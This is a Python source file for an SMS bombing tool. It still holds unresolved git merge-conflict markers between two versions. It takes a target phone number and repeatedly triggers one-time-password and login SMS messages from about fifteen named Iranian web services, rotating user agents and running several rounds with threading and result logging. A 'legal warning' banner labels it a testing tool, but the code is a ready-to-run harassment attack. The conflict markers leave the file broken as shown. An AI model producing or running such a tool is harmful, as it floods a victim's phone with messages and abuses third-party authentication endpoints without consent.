import requests
import time
import json
import random
<<<<<<< HEAD
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import track
from rich.table import Table

# Initialize console for rich output
console = Console()

# List of user agents for random header selection
=======
from rich.console import Console
from rich.panel import Panel
from rich.progress import track
from rich.table import Table
from datetime import datetime

console = Console()

>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

<<<<<<< HEAD
# Set up logging
logging.basicConfig(
    filename='sms_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def get_random_headers():
    """Generate random headers with a user agent."""
=======
def get_random_headers():
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b
    return {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/json'
    }

<<<<<<< HEAD
def validate_phone(phone):
    """Validate phone number format (must start with 09 and be 11 digits)."""
    if not phone.startswith("09") or len(phone) != 11 or not phone.isdigit():
        console.print("[bold red]Invalid phone number. It must start with '09' and be 11 digits.[/bold red]")
        return False
    return True

def load_services():
    """Load service definitions from an external JSON file."""
    try:
        with open('SiteList.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print("[bold red]Error: SiteList.json file not found![/bold red]")
        return []

def send_sms(service, phone):
    """Send an SMS request to a specified service."""
    if service.get("is_get"):
        try:
            res = requests.get(service["url"] + phone, headers=get_random_headers(), timeout=10)
            status = res.status_code == 200
            log_entry(service["name"], "success" if status else "failed")
            return status
        except requests.exceptions.RequestException as e:
            log_entry(service["name"], f"error: {str(e)}")
=======
def get_target_number():
    console.print("[bold cyan]Enter mobile number without 0 (example: 9121234567):[/bold cyan]", end=" ")
    number = input().strip()
    if number.startswith("0"):
        number = number[1:]
    return "0" + number

services = [
    {"name": "Snapp", "url": "https://api.snapp.ir/api/v1/sms/link", "json_key": "phone", "extra_json": {"type": "LOGIN"}},
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "json_key": "phone"},
    {"name": "Tap30", "url": "https://api.tapsi.cab/api/v2.3/user", "json_key": "credential", "extra_json": {"otpOption": "SMS"}},
    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "json_key": "username"},
    {"name": "Basalam", "url": "https://auth.basalam.com/otp-request", "json_key": "mobile"},
    {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "json_key": "phoneNumber"},
    {"name": "Filimo", "url": "https://www.filimo.com/api/fa/v1/user/Authenticate/sendotp", "json_key": "cellphone"},
    {"name": "Namava", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "json_key": "UserName"},
    {"name": "DigiKala", "url": "https://api.digikala.com/v1/user/authenticate/", "json_key": "username"},
    {"name": "Torob", "url": "https://api.torob.com/v4/user/send-auth-code/", "json_key": "phone_number"},
    {"name": "Aparat", "url": "https://www.aparat.com/api/fa/v1/user/Authenticate/check_mobile", "json_key": "mobile"},
    {"name": "Okala", "url": "https://api.okala.com/api/v2/account/request-otp", "json_key": "mobile"},
    {"name": "Digistyle", "url": "https://www.digistyle.com/api/v1/user/authenticate/", "json_key": "username"},
    {"name": "Shad", "url": "https://authbeta.snd.ir/api/v2/login/request", "json_key": "username"},
    {"name": "Gap", "url": "https://core.gap.im/v1/user/add.json?mobile=", "is_get": True},
]

def send_sms(service, phone):
    if service.get("is_get"):
        try:
            res = requests.get(service["url"] + phone, headers=get_random_headers(), timeout=10)
            return res.status_code == 200
        except:
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b
            return False

    json_data = {service["json_key"]: phone}
    if service.get("extra_json"):
        json_data.update(service["extra_json"])

    try:
        res = requests.post(service["url"], json=json_data, headers=get_random_headers(), timeout=10)
<<<<<<< HEAD
        status = res.status_code == 200
        log_entry(service["name"], "success" if status else f"failed (status: {res.status_code})")
        return status
    except requests.exceptions.RequestException as e:
        log_entry(service["name"], f"error: {str(e)}")
        return False

def log_entry(service_name, status):
    """Log the result of an SMS attempt."""
    logging.info(f"Service: {service_name}, Status: {status}")
    if "success" in status:
        console.print(f"[green]✔ {service_name} Success[/green]")
    elif "error" in status:
        console.print(f"[yellow]⚠ {service_name} Error: {status.split(': ')[1]}[/yellow]")
    else:
        console.print(f"[red]✘ {service_name} Failed[/red]")

def save_report(data):
    """Save the report to a JSON file."""
=======
        return res.status_code == 200
    except:
        return False

def save_report(data):
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"sms_report_{now}.json"
    with open(filename, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return filename

def show_summary(success, failed, errors):
<<<<<<< HEAD
    """Display a summary table of results."""
=======
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b
    table = Table(title="📊 Final Report", title_style="bold green")
    table.add_column("Status", justify="center", style="cyan")
    table.add_column("Count", justify="center", style="magenta")
    table.add_row("✅ Success", str(success))
    table.add_row("❌ Failed", str(failed))
    table.add_row("⚠ Error", str(errors))
    console.print(table)

def main():
<<<<<<< HEAD
    """Main function to run the SMS testing tool."""
    console.print(Panel("[bold red]⚠ Legal Warning: This tool should only be used for testing and security assessment. Unauthorized use is prosecutable.[/bold red]"))

    # Get and validate phone number
    phone = Prompt.ask("[bold cyan]Enter mobile number (example: 09121234567)[/bold cyan]", default="09121234567")
    if not validate_phone(phone):
        return

    # Get number of rounds
    rounds = int(Prompt.ask("[bold cyan]Enter number of rounds to send to each service (example: 2)[/bold cyan]", default="2"))

    # Load services
    services = load_services()
    if not services:
        return

    console.print(Panel(f"[bold green]Starting SMS test to {phone} with {len(services)} services in {rounds} rounds[/bold green]"))
    logging.info(f"Starting SMS test to {phone} with {len(services)} services in {rounds} rounds")
=======
    console.print(Panel("[bold red]⚠ Legal Warning: This tool should only be used for testing and security assessment. Unauthorized use is prosecutable.[/bold red]"))
    phone = get_target_number()

    console.print("[bold cyan]Enter number of rounds to send to each service (example: 2):[/bold cyan]", end=" ")
    rounds = int(input().strip())

    console.print(Panel(f"[bold green]Starting SMS test to number {phone} with {len(services)} services in {rounds} rounds[/bold green]"))
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b

    success = 0
    failed = 0
    error = 0
    report_log = []

    for round_num in track(range(1, rounds + 1), description="[yellow]Running test...[/yellow]"):
<<<<<<< HEAD
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(send_sms, service, phone): service for service in services}
            for future in futures:
                service = futures[future]
                try:
                    result = future.result()
                    entry = {
                        "round": round_num,
                        "service": service["name"],
                        "status": "success" if result else "failed",
                        "time": datetime.now().isoformat()
                    }
                    report_log.append(entry)
                    if result:
                        success += 1
                    else:
                        failed += 1
                except Exception as e:
                    error += 1
                    report_log.append({
                        "round": round_num,
                        "service": service["name"],
                        "status": f"error: {str(e)}",
                        "time": datetime.now().isoformat()
                    })
        time.sleep(random.uniform(1, 3))  # Random delay between rounds
=======
        for service in services:
            result = send_sms(service, phone)
            entry = {
                "round": round_num,
                "service": service["name"],
                "status": "success" if result else "failed",
                "time": datetime.now().isoformat()
            }
            report_log.append(entry)
            if result:
                success += 1
                console.print(f"[green]✔ {service['name']} Success[/green]")
            else:
                failed += 1
                console.print(f"[red]✘ {service['name']} Failed[/red]")
            time.sleep(1)
>>>>>>> 5ffe07cb10ca28f8e1f868e30c6137d99e0eca5b

    show_summary(success, failed, error)
    filename = save_report(report_log)
    console.print(f"[bold yellow]📁 Report saved to file: [green]{filename}[/green][/bold yellow]")

if __name__ == "__main__":
    main()